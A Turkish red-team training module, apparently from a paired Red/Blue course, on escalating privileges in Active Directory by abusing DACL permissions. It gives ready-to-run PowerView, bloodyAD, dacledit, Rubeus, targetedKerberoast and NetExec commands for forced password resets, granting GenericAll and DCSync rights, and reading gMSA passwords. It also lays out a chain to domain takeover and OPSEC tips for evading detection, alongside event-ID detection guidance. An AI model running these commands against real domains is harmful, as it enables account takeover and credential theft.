## 1. Kavramsal Temel — Neden Var?

AD'de yetki yükseltme çoğu zaman bir "exploit" değil, **yanlış yapılandırılmış bir iznin** kullanılmasıdır. Kilit içgörü:

> **AD'deki her nesne bir DACL (Discretionary Access Control List) taşır — "kim bu nesne üzerinde ne yapabilir" listesi. Yıllar içinde biriken hatalı yetki devirleri (helpdesk'e "her şeyi yapabilme", eski ekiplere unutulmuş haklar) saldırgana zincir sağlar: Sıradan bir hesabın Domain Admins üzerinde GenericAll'ı, bir yama ile kapanmaz — bu bir "özellik kötüye kullanımı"dır (abuse), açık değil.**

Bu, savunma açısından en sinsi yüzeydir çünkü: (1) tespit değil, **hijyen** gerektirir; (2) meşru araçlarla (parola sıfırlama, grup ekleme) yürür → EDR imzası yoktur; (3) BloodHound ([01.2](../Modul_01_Kesif_ve_Numaralandirma/01.2_SharpHound_ve_BloodHound.md)) bu kenarları saniyede haritalar.

**Analoji:** Her odanın kapısında "kim ne yapabilir" tabelası (DACL) var. `GenericAll` = "bu oda üzerinde her şeyi yapabilirsin" yazan bir tabela. Biri yanlışlıkla temizlikçiye CEO odası için böyle bir tabela asmışsa, temizlikçi CEO'nun kimliğini ele geçirebilir.

## 2. Teknik Derinlik — Hangi Hak Neye Dönüşür

### 2.1 Tehlikeli ACE → sömürü eylemi haritası

```
   Hedef üzerinde elimdeki hak            →  Yapabileceğim
   ───────────────────────────────────────────────────────────
   GenericAll (tam kontrol)              →  parola sıfırla / SPN yaz / KeyCredential ekle
   GenericWrite / WriteProperty          →  SPN yaz (targeted Kerberoast) / logonScript
   WriteDacl                             →  kendime GenericAll ver → sonra yukarısı
   WriteOwner                            →  sahipliği al → WriteDacl → GenericAll (05.2)
   ForceChangePassword (ext. right)      →  parolayı BİLMEDEN sıfırla
   AllExtendedRights                     →  ForceChangePassword + DCSync (kullanıcı/domain)
   AddKeyCredentialLink                  →  Shadow Credentials → PKINIT (05.4)
```

### 2.2 Yükseltme mi, yoksa "yanal" mı? — ACE zincirleme

Tek bir ACE nadiren doğrudan DA verir; genelde **zincir** gerekir. BloodHound'un gücü budur:

```
   [jdoe] ─GenericWrite→ [svc-app]           (targeted Kerberoast → svc-app parolası)
   [svc-app] ─MemberOf→ [SERVER ADMINS]
   [SERVER ADMINS] ─GenericAll→ [SRV-DB]     (SRV-DB'de yerel admin → LSASS)
   [SRV-DB LSASS] → [tier1-adm] ─WriteDacl→ [Domain Admins]  🏁
```

Her kenar bu modülün bir tekniğine karşılık gelir; operatör en kısa/en sessiz zinciri seçer.

### 2.3 AccessMask bit değerleri (paket seviyesi)

Bir ACE'nin `AccessMask`'ı 32-bit bir bayrak alanıdır; BloodHound'un "GenericAll" dediği şey aslında şu bitlerin birleşimidir:

```
   GENERIC_ALL        0x10000000   → her şey
   GENERIC_WRITE      0x40000000
   WRITE_DAC          0x00040000   → WriteDacl
   WRITE_OWNER        0x00080000   → WriteOwner
   ADS_RIGHT_DS_WRITE_PROP 0x00000020  → WriteProperty (SPN/member/gPLink…)
   ADS_RIGHT_DS_CONTROL_ACCESS 0x00000100 → ExtendedRight (ForceChangePassword/DCSync)
   → dacledit/PowerView bu bitleri okunur ada çevirir; ham LDAP'ta bit maskesini tanı.
```

### 2.4 ForceChangePassword'ün inceliği

Bu **extended right** (GUID `00299570-...`), hedefin **mevcut parolasını bilmeden** yeni parola atamana izin verir. Ama gürültülüdür: parolayı değiştirdiğinde gerçek kullanıcı/servis **giriş yapamaz** → arıza bildirimi → tespit. Servis hesaplarında bu, servis çökmesine yol açabilir. Bu yüzden mümkünse **Shadow Credentials** ([05.4](./05.4_Shadow_Credentials.md)) tercih edilir: parolayı hiç değiştirmeden, sertifika ekleyerek kimliğe bürünürsün.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 GenericAll / ForceChangePassword → parola sıfırlama

```powershell
# PowerView (Windows) — hedefin parolasını sıfırla (GenericAll/ForceChangePassword)
$pw = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
Set-DomainUserPassword -Identity svc-sql -AccountPassword $pw
```

```bash
# Linux — net rpc veya bloodyAD/pth ile
net rpc password "svc-sql" "NewP@ss123!" -U "corp.local/jdoe%Welcome1" -S dc01.corp.local
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 set password svc-sql 'NewP@ss123!'
# hedefin parolasını bilmeden (ForceChangePassword) — aynı komut, mevcut parola sorulmaz
```

### 3.2 GenericWrite → targeted Kerberoast (parola değiştirmeden)

```powershell
# Hedefe geçici SPN yaz → roast → SPN'i temizle (05: parola sıfırlamaktan daha sessiz)
Set-DomainObject -Identity svc-app -Set @{serviceprincipalname='fake/roast'}
Rubeus.exe kerberoast /user:svc-app /nowrap
Set-DomainObject -Identity svc-app -Clear serviceprincipalname
```

```bash
targetedKerberoast.py -d corp.local -u jdoe -p 'Welcome1' --request-user svc-app --dc-ip 10.10.10.5
```

### 3.3 WriteDacl → kendine GenericAll ver

```powershell
# PowerView — hedefin DACL'ine kendime tam kontrol ACE ekle
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity jdoe -Rights All
```

```bash
# Impacket dacledit — WriteDacl'ı kullanarak yeni ACE yaz
dacledit.py -action write -rights FullControl -principal jdoe \
  -target "Domain Admins" corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5
```

**Örnek doğrulama:**
```
[*] DACL modified successfully!  jdoe now has FullControl over CN=Domain Admins
# → sonra: kendini gruba ekle (05.2) veya DCSync ACL'i ekle (Modül 09)
```

### 3.4 AllExtendedRights → DCSync hakkı verme (domain nesnesine)

```powershell
# Domain nesnesine DCSync ACE'leri ekle (GetChanges + GetChangesAll) → Modül 09
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity jdoe `
  -Rights DCSync
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| Parola sıfırlama (Force/GenericAll) | **T1098** (Account Manipulation) | **4724** (parola reset girişimi), 4738 (hesap değişti) | [Blue 05.2](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.2_Tehlikeli_DACL_Denetimi_ve_Temizligi.md) |
| DACL değişikliği (WriteDacl) | **T1222.001** (Windows DACL Modification) | **5136** (dizin nesnesi değişti, SACL varsa), nTSecurityDescriptor write | [Blue 05.2](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.2_Tehlikeli_DACL_Denetimi_ve_Temizligi.md) |
| Targeted Kerberoast (GenericWrite) | T1558.003 | SPN yaz/sil (5136) + 4769 | [Blue 02.3](../../2-Blue_Team/Modul_02_SIEM_ve_Tespit_Muhendisligi/02.3_Kerberoasting_AS_REP_Tespiti.md) |
| DCSync ACE ekleme | T1098 + T1003.006 | 5136 domain nesnesine GetChangesAll ACE | [Blue 05.4](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.4_AdminSDHolder_ve_SDProp_Izleme.md) |

**OPSEC notları:**
- **5136 (Directory Service Changes)** yalnızca hedef nesnenin **SACL**'ında denetim etkinse loglanır. Kritik nesneler (Domain Admins, domain kökü, AdminSDHolder) genelde denetlenir ([Blue 05.2](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.2_Tehlikeli_DACL_Denetimi_ve_Temizligi.md)) → buralara DACL yazmak yüksek-değerli alarm üretir. Zinciri **düşük-değerli ara nesneler** üzerinden kur, doğrudan Domain Admins'e dokunma.
- **ForceChangePassword servis kesintisi yapar** → parola değiştirdiğin servis çöker, arıza bildirimi = tespit. Servis hesaplarında **targeted Kerberoast** (parola değiştirmez) veya **Shadow Credentials** ([05.4](./05.4_Shadow_Credentials.md)) tercih et.
- **DACL değişikliğini geri al** — engagement sonrası (veya iz bırakmamak için) eklediğin ACE'yi temizle; kalıcı DACL değişikliği hem tespit hem de "temizlik borcu"dur.
- **AdminSDHolder etkisi:** Korunan gruplara ([Blue 05.4](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.4_AdminSDHolder_ve_SDProp_Izleme.md)) doğrudan yazdığın ACE, **SDProp** (60 dk'da bir) tarafından geri alınabilir → kalıcılık için AdminSDHolder'ın kendisini hedefle ([Modül 09](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/)).

## 5. Doğrulama / Lab

```powershell
# 1) Lab: jdoe'ya svc-sql üzerinde ForceChangePassword ver. jdoe olarak sıfırla:
Set-DomainUserPassword -Identity svc-sql -AccountPassword $pw
# 2) jdoe'ya Domain Admins üzerinde WriteDacl ver → Add-DomainObjectAcl ile GenericAll al
# 3) Blue: 4724 ve 5136 olaylarını Get-WinEvent ile yakala (SACL etkin olmalı)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136} | Select -First 5 Message
# 4) SACL kapalı bir nesnede aynı işlemi yap → 5136 üretilmediğini gözle (görünürlük boşluğu)
```

Atomic Red Team: **T1098 / T1222.001** → Blue doğrulaması [Blue 05.2](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.2_Tehlikeli_DACL_Denetimi_ve_Temizligi.md).

### Gerçek-dünya DACL zinciri (BloodHound'dan DA'ya)

```
   1) 01.3: jdoe → helpdesk grubu → svc-app üzerinde GenericWrite
   2) svc-app'e geçici SPN yaz → targeted Kerberoast → 'App2019!' kır (parola bozmadan)
   3) svc-app → 'Backup Operators' üyesi → SeBackupPrivilege
   4) Backup Operators ile DC'de NTDS.dit + SYSTEM hive kopyala (reg save / VSS)
   5) offline secretsdump → krbtgt + tüm domain hash → DCSync/Golden (Modül 09)
   Not: 2. adımda ForceChangePassword yerine roast seçildi → servis çökmedi, alarm azaldı.
```

### Ek: gMSA parola okuma (ReadGMSAPassword ACE)

```powershell
# Hedef gMSA üzerinde 'ReadGMSAPassword' hakkın varsa parolayı doğrudan oku (kırma yok)
Get-ADServiceAccount -Identity 'gmsa-sql$' -Properties msDS-ManagedPassword
# NetExec ile:
nxc ldap dc01 -u jdoe -p 'Welcome1' --gmsa    # yetkin olduğun gMSA'ların parolası
```
gMSA parolası 120+ karakterdir ama okuma hakkın varsa **NT hash'ini** doğrudan alıp PtH yaparsın — kırmaya gerek kalmaz.
